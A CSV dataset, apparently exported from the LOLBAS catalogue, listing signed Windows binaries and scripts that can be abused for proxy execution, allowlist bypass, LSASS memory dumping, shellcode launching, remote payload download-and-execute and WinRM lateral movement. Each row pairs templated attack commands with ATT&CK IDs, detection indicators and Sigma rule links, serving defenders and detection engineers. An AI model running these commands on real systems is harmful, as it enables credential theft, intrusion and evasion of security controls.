"Name","Description","Author","Created","Commands","Commands_Command","Commands_Description","Commands_Usecase","Commands_Category","Commands_Privileges","Commands_MitreID","Commands_OperatingSystem","Commands_Tags","Commands_Tags_Download","Full_Path","Full_Path_Path","Detection","Detection_IOC","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","Commands_Tags_Execute","Resources","Resources_Link","Code_Sample","Code_Sample_Code","Detection_Sigma","Detection_Analysis","Detection_BlockRule","Commands_Tags_Requires","Commands_Tags_Input","Detection_Splunk","Detection_Elastic","Aliases","Aliases_Alias","Commands_Tags_Application","Commands_Tags_Type","is_legit"
"DefaultPack.EXE","This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.","@checkymander","2020-10-01","","DefaultPack.EXE /C:""{CMD}""","Use DefaultPack.EXE to execute arbitrary binaries, with added argument support.","Can be used to execute stagers, binaries, and other malicious commands.","Execute","User","T1218","Windows","","","","C:\Program Files (x86)\Microsoft\DefaultPack\DefaultPack.exe","","DefaultPack.EXE spawned an unknown process","","checkymander","@checkymander","CMD","","https://twitter.com/checkymander/status/1311509470275604480.","","","https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_defaultpack.yml","","","","","","","","","","","false"
"csi.exe","Command line interface included with Visual Studio.","Oddvar Moe","2018-05-25","","csi.exe {PATH:.cs}","Use csi.exe to run unsigned C# code.","Local execution of unsigned C# code.","Execute","User","T1127","Windows","","","","[''c:\Program Files (x86)\Microsoft Visual Studio\2017\Community\MSBuild\15.0\Bin\Roslyn\csi.exe''-|-''c:\Program Files (x86)\Microsoft Web Tools\Packages\Microsoft.Net.Compilers.X.Y.Z\tools\csi.exe'']","","","","Casey Smith","@subtee","CSharp","","[''https://twitter.com/subTee/status/781208810723549188''-|-''https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/'']","","","[''https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_csi_execution.yml''-|-''https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_csi_use_of_csharp_console.yml'']","","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","","","","[''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml''-|-''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml'']","","","","","false"
"Createdump.exe","Microsoft .NET Runtime Crash Dump Generator (included in .NET Core)","mr.d0x, Daniel Santos","2022-01-20","","createdump.exe -n -f {PATH:.dmp} {PID}","Dump process by PID and create a minidump file. If ""-f dump.dmp"" is not specified, the file is created as '%TEMP%\dump.%p.dmp' where %p is the PID of the target process.","Dump process memory contents using PID.","Dump","SYSTEM","T1003","Windows 10, Windows 11","","","","[''C:\Program Files\dotnet\shared\Microsoft.NETCore.App\<version>\createdump.exe''-|-''C:\Program Files (x86)\dotnet\shared\Microsoft.NETCore.App\<version>\createdump.exe''-|-''C:\Program Files\Microsoft Visual Studio\<version>\Community\dotnet\runtime\shared\Microsoft.NETCore.App\6.0.0\createdump.exe''-|-''C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\dotnet\runtime\shared\Microsoft.NETCore.App\6.0.0\createdump.exe'']","","createdump.exe process with a command line containing the lsass.exe process id","","bopin","@bopin2020","","","[''https://twitter.com/bopin2020/status/1366400799199272960''-|-''https://docs.microsoft.com/en-us/troubleshoot/developer/webapps/aspnetcore/practice-troubleshoot-linux/lab-1-3-capture-core-crash-dumps'']","","","[''https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_proc_dump_createdump.yml''-|-''https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_renamed_createdump.yml'']","","","","","","","","","","","false"
"coregen.exe","Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within ""C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\"" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.","Martin Sohn Christensen","2020-10-09","","[''coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name''-|-''coregen.exe dummy_assembly_name''-|-''coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name'']","[''Loads the target .DLL in arbitrary path specified with /L.''-|-''Loads the coreclr.dll in the corgen.exe directory (e.g. C:\Program Files\Microsoft Silverlight\5.1.50918.0).''-|-''Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions.'']","[''Execute DLL code''-|-''Execute DLL code''-|-''Execute DLL code'']","[''Execute''-|-''Execute''-|-''AWL Bypass'']","[''User''-|-''User''-|-''User'']","[''T1055''-|-''T1055''-|-''T1218'']","[''Windows''-|-''Windows''-|-''Windows'']","","","","[''C:\Program Files\Microsoft Silverlight\5.1.50918.0\coregen.exe''-|-''C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\coregen.exe'']","","[''coregen.exe loading .dll file not in ""C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\""''-|-''coregen.exe loading .dll file not named coreclr.dll''-|-''coregen.exe command line containing -L or -l''-|-''coregen.exe command line containing unexpected/invald assembly name''-|-''coregen.exe application crash by invalid assembly name'']","","[''Nicky Tyrer''-|-''Evan Pena''-|-''Casey Erikson'']","","[''DLL''-|-''DLL''-|-''DLL'']","","[''https://www.youtube.com/watch?v=75XImxOOInU''-|-''https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html'']","","","https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/image_load/image_load_side_load_coregen.yml","","","","","","","","","","","false"
"Cdb.exe","Debugging tool included with Windows Debugging Tools.","Oddvar Moe","2018-05-25","","[''cdb.exe -cf {PATH:.wds} -o notepad.exe''-|-''cdb.exe -pd -pn {process_name} .shell {CMD} ''-|-''cdb.exe -c {PATH:.txt} ""{CMD}""'']","[''Launch 64-bit shellcode from the specified .wds file using cdb.exe.''-|-''Attaching to any process and executing shell commands.''-|-''Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file).'']","[''Local execution of assembly shellcode.''-|-''Run a shell command under a trusted Microsoft signed binary''-|-''Run commands under a trusted Microsoft signed binary'']","[''Execute''-|-''Execute''-|-''Execute'']","[''User''-|-''User''-|-''User'']","[''T1127''-|-''T1127''-|-''T1127'']","[''Windows''-|-''Windows''-|-''Windows'']","","","","[''C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe''-|-''C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe'']","","","","[''Matt Graeber''-|-''mr.d0x''-|-''Spooky Sec''-|-''Nasreddine Bencherchali'']","[''@mattifestation''-|-''@mrd0x''-|-''@sec_spooky''-|-''@nas_bench'']","[''Shellcode''-|-''CMD''-|-''CMD'']","","[''http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html''-|-''https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/cdb-command-line-options''-|-''https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda''-|-''https://mrd0x.com/the-power-of-cdb-debugging-tool/''-|-''https://twitter.com/nas_bench/status/1534957360032120833'']","","https://gist.github.com/nasbench/d9c15864f1e21bdd8b7cf55997b45f4b","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_cdb.yml","","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","","","","[''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml''-|-''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml'']","","","","","false"
"Bginfo.exe","Background Information Utility included with SysInternals Suite","Oddvar Moe","2018-05-25","","[''bginfo.exe {PATH:.bgi} /popup /nolicprompt''-|-''bginfo.exe {PATH:.bgi} /popup /nolicprompt''-|-''\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt''-|-''\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt''-|-''\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt''-|-''\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt'']","[''Execute VBscript code that is referenced within the specified .bgi file.''-|-''Execute VBscript code that is referenced within the specified .bgi file.''-|-''Execute bginfo.exe from a WebDAV server.''-|-''Execute bginfo.exe from a WebDAV server.''-|-''This style of execution may not longer work due to patch.''-|-''This style of execution may not longer work due to patch.'']","[''Local execution of VBScript''-|-''Local execution of VBScript''-|-''Remote execution of VBScript''-|-''Remote execution of VBScript''-|-''Remote execution of VBScript''-|-''Remote execution of VBScript'']","[''Execute''-|-''AWL Bypass''-|-''Execute''-|-''AWL Bypass''-|-''Execute''-|-''AWL Bypass'']","[''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User'']","[''T1218''-|-''T1218''-|-''T1218''-|-''T1218''-|-''T1218''-|-''T1218'']","[''Windows''-|-''Windows''-|-''Windows''-|-''Windows''-|-''Windows''-|-''Windows'']","","","","no default","","","","Oddvar Moe","@oddvarmoe","[''WSH''-|-''WSH''-|-''WSH''-|-''WSH''-|-''WSH''-|-''Remote''-|-''WSH''-|-''Remote'']","","https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml","","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","","","","[''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml''-|-''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml'']","","","","","false"
"Appvlp.exe","Application Virtualization Utility Included with Microsoft Office 2016","Oddvar Moe","2018-05-25","","[''AppVLP.exe {PATH_SMB:.bat}''-|-''AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)""'']","[''Executes .bat file through AppVLP.exe''-|-''Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.'']","[''Execution of BAT file hosted on Webdav server.''-|-''Local execution of process bypassing Attack Surface Reduction (ASR).'']","[''Execute''-|-''Execute'']","[''User''-|-''User'']","[''T1218''-|-''T1218'']","[''Windows 10 w/Office 2016''-|-''Windows 10 w/Office 2016'']","","","","[''C:\Program Files\Microsoft Office\root\client\appvlp.exe''-|-''C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe'']","","","","[''fab''-|-''Will''-|-''Matt Wilson'']","[''@0rbz_''-|-''@moo_hax''-|-''@enigma0x3'']","[''CMD''-|-''EXE'']","","[''https://github.com/MoooKitty/Code-Execution''-|-''https://twitter.com/moo_hax/status/892388990686347264''-|-''https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/''-|-''https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/'']","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_appvlp.yml","","","","","","","","","","","false"
"AppCert.exe","Windows App Certification Kit command-line tool.","Avihay Eldad","2024-03-06","","[''appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}''-|-''appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml}'']","[''Execute an executable file via the Windows App Certification Kit command-line tool.''-|-''Install an MSI file via an msiexec instance spawned via appcert.exe as parent process.'']","[''Performs execution of specified file, can be used as a defense evasion''-|-''Execute custom made MSI file with malicious code'']","[''Execute''-|-''Execute'']","[''Administrator''-|-''Administrator'']","[''T1127''-|-''T1218.007'']","[''Windows''-|-''Windows'']","","","","[''C:\Program Files (x86)\Windows Kits\10\App Certification Kit\appcert.exe''-|-''C:\Program Files\Windows Kits\10\App Certification Kit\appcert.exe'']","","","","Avihay Eldad","@AvihayEldad","[''EXE''-|-''MSI'']","","https://learn.microsoft.com/windows/win32/win_cert/using-the-windows-app-certification-kit","","","","","","","","","","","","","","false"
"AgentExecutor.exe","Intune Management Extension included on Intune Managed Devices","Eleftherios Panos","2020-07-23","","[''AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""C:\Windows\SysWOW64\WindowsPowerShell\v1.0"" 0 1''-|-''AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""{PATH_ABSOLUTE:folder}"" 0 1'']","[''Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument''-|-''If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will execute it successfully'']","[''Execute unsigned powershell scripts''-|-''Execute a provided EXE'']","[''Execute''-|-''Execute'']","[''User''-|-''User'']","[''T1218''-|-''T1218'']","[''Windows 10''-|-''Windows 10'']","","","","C:\Program Files (x86)\Microsoft Intune Management Extension\AgentExecutor.exe","","","","Eleftherios Panos","@lefterispan","[''PowerShell''-|-''EXE'']","","","","","[''https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_agentexecutor.yml''-|-''https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_agentexecutor_susp_usage.yml'']","","","","","","","","","","","false"
"adplus.exe","Debugging tool included with Windows Debugging Tools","mr.d0x","2021-09-01","","[''adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet''-|-''adplus.exe -c {PATH:.xml}''-|-''adplus.exe -c {PATH:.xml}''-|-''adplus.exe -crash -o ""{PATH_ABSOLUTE:folder}"" -sc {PATH:.exe}'']","[''Creates a memory dump of the lsass process''-|-''Execute arbitrary commands using adplus config file (see Resources section for a sample file).''-|-''Dump process memory using adplus config file (see Resources section for a sample file).''-|-''Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required.'']","[''Create memory dump and parse it offline''-|-''Run commands under a trusted Microsoft signed binary''-|-''Run commands under a trusted Microsoft signed binary''-|-''Run commands under a trusted Microsoft signed binary'']","[''Dump''-|-''Execute''-|-''Dump''-|-''Execute'']","[''SYSTEM''-|-''User''-|-''SYSTEM''-|-''User'']","[''T1003.001''-|-''T1127''-|-''T1003.001''-|-''T1127'']","[''All Windows''-|-''All Windows''-|-''All Windows''-|-''All windows'']","","","","[''C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\adplus.exe''-|-''C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\adplus.exe'']","","As a Windows SDK binary, execution on a system may be suspicious","","[''mr.d0x''-|-''Nasreddine Bencherchali'']","[''@mrd0x''-|-''@nas_bench'']","[''CMD''-|-''CMD''-|-''EXE'']","","[''https://mrd0x.com/adplus-debugging-tool-lsass-dump/''-|-''https://twitter.com/nas_bench/status/1534916659676422152''-|-''https://twitter.com/nas_bench/status/1534915321856917506'']","","https://gist.github.com/nasbench/e34ca2cd90e3a845a558a102a4f607da","https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_adplus.yml","","","","","","","","","","","false"
"AccCheckConsole.exe","Verifies UI accessibility requirements","bohops","2022-01-02","","[''AccCheckConsole.exe -window ""Untitled - Notepad"" {PATH_ABSOLUTE:.dll}''-|-''AccCheckConsole.exe -window ""Untitled - Notepad"" {PATH_ABSOLUTE:.dll}'']","[''Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.''-|-''Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.'']","[''Local execution of managed code from assembly DLL.''-|-''Local execution of managed code to bypass AppLocker.'']","[''Execute''-|-''AWL Bypass'']","[''User''-|-''User'']","[''T1218''-|-''T1218'']","[''Windows''-|-''Windows'']","","","","[''C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\x86\AccChecker\AccCheckConsole.exe''-|-''C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\x64\AccChecker\AccCheckConsole.exe''-|-''C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\arm\AccChecker\AccCheckConsole.exe''-|-''C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\arm64\AccChecker\AccCheckConsole.exe'']","","Sysmon Event ID 1 - Process Creation","","Jimmy","@bohops","[''DLL (.NET)''-|-''DLL (.NET)'']","","[''https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340''-|-''https://twitter.com/bohops/status/1477717351017680899'']","","https://docs.microsoft.com/en-us/windows/win32/winauto/custom-verification-routines","https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_susp_acccheckconsole.yml","https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340","","","","","","","","","","false"
"Pester.bat","Used as part of the Powershell pester","Oddvar Moe","2018-05-25","","[''Pester.bat [/help|?|-?|/?] ""$null; {CMD}""''-|-''Pester.bat ;{PATH:.exe}'']","[''Execute code using Pester. The third parameter can be anything. The fourth is the payload.''-|-''Execute code using Pester. Example here executes specified executable.'']","[''Proxy execution''-|-''Proxy execution'']","[''Execute''-|-''Execute'']","[''User''-|-''User'']","[''T1216''-|-''T1216'']","[''Windows 10, Windows 11''-|-''Windows 10, Windows 11'']","","","","c:\Program Files\WindowsPowerShell\Modules\Pester\<VERSION>\bin\Pester.bat","","","","[''Emin Atac''-|-''Stamatis Chatzimangou'']","[''@p0w3rsh3ll''-|-''@_st0pp3r_'']","[''EXE''-|-''EXE'']","","[''https://twitter.com/Oddvarmoe/status/993383596244258816''-|-''https://twitter.com/_st0pp3r_/status/1560072680887525378''-|-''https://twitter.com/_st0pp3r_/status/1560072680887525378'']","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_pester_1.yml","","","","","","","","","","","false"
"winrm.vbs","Script used for manage Windows RM settings","Oddvar Moe","2018-05-25","","[''winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""{CMD}""} -r:http://target:5985''-|-''winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""{CMD}""} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985''-|-''%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty'']","[''Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol''-|-''Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol''-|-''Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.'']","[''Proxy execution''-|-''Proxy execution''-|-''Execute arbitrary, unsigned code via XSL script'']","[''Execute''-|-''Execute''-|-''AWL Bypass'']","[''User''-|-''Admin''-|-''User'']","[''T1216''-|-''T1216''-|-''T1220'']","[''Windows 10, Windows 11''-|-''Windows 10, Windows 11''-|-''Windows 10, Windows 11'']","","","","[''C:\Windows\System32\winrm.vbs''-|-''C:\Windows\SysWOW64\winrm.vbs'']","","","","[''Matt Graeber''-|-''Matt Nelson''-|-''Casey Smith''-|-''Jimmy''-|-''Red Canary Company cc Tony Lambert'']","[''@mattifestation''-|-''@enigma0x3''-|-''@subtee''-|-''@bohops''-|-''@redcanaryco'']","[''CMD''-|-''Remote''-|-''CMD''-|-''Remote''-|-''XSL'']","","[''https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology''-|-''https://www.youtube.com/watch?v=3gz1QmiMhss''-|-''https://github.com/enigma0x3/windows-operating-system-archaeology''-|-''https://redcanary.com/blog/lateral-movement-winrm-wmi/''-|-''https://twitter.com/bohops/status/994405551751815170''-|-''https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404''-|-''https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf'']","","[''https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr.reg''-|-''https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct'']","[''https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml''-|-''https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml''-|-''https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_winrm_awl_bypass.yml'']","","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","","","","","","","","","false"
"UtilityFunctions.ps1","PowerShell Diagnostic Script","Jimmy (@bohops)","2021-09-26","","powershell.exe -ep bypass -command ""set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()""","Proxy execute Managed DLL with PowerShell","Execute proxied payload with Microsoft signed binary","Execute","User","T1216","Windows 10 21H1 (likely other versions as well), Windows 11","","","","C:\Windows\diagnostics\system\Networking\UtilityFunctions.ps1","","","","Nick VanGilder","@nickvangilder","DLL (.NET)","","https://twitter.com/nickvangilder/status/1441003666274668546","","","https://github.com/SigmaHQ/sigma/blob/0.21-688-gd172b136b/rules/windows/process_creation/proc_creation_win_lolbas_utilityfunctions.yml","","","","","","","","","","","false"
"Syncappvpublishingserver.vbs","Script used related to app-v and publishing server","Oddvar Moe","2018-05-25","","SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""","Inject PowerShell script code with the provided arguments","Use Powershell host invoked from vbs script","Execute","User","T1216.002","Windows 10, Windows 11","","","","C:\Windows\System32\SyncAppvPublishingServer.vbs","","","","[''Nick Landers''-|-''Casey Smith'']","[''@monoxgas''-|-''@subtee'']","PowerShell","","[''https://twitter.com/monoxgas/status/895045566090010624''-|-''https://twitter.com/subTee/status/855738126882316288'']","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml","","","","","","","","","","","false"
"Pubprn.vbs","Proxy execution with Pubprn.vbs","Oddvar Moe","2018-05-25","","pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}","Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection","Proxy execution","Execute","User","T1216.001","Windows 10","","","","[''C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs''-|-''C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs'']","","","","Matt Nelson","@enigma0x3","SCT","","[''https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/''-|-''https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology''-|-''https://github.com/enigma0x3/windows-operating-system-archaeology'']","","https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Pubprn_calc.sct","https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml","","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","","","","","","","","","false"
"Manage-bde.wsf","Script for managing BitLocker","Oddvar Moe","2018-05-25","","[''set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf''-|-''copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf'']","[''Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.''-|-''Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.'']","[''Proxy execution from script''-|-''Proxy execution from script'']","[''Execute''-|-''Execute'']","[''User''-|-''User'']","[''T1216''-|-''T1216'']","[''Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","C:\Windows\System32\manage-bde.wsf","","Manage-bde.wsf should not be invoked by a standard user under normal situations","","[''Jimmy''-|-''Daniel Bohannon''-|-''John Lambert'']","[''@bohops''-|-''@danielbohannon''-|-''@JohnLaTwC'']","[''EXE''-|-''EXE'']","","[''https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712''-|-''https://twitter.com/bohops/status/980659399495741441''-|-''https://twitter.com/JohnLaTwC/status/1223292479270600706'']","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_manage_bde.yml","","","","","","","","","","","false"
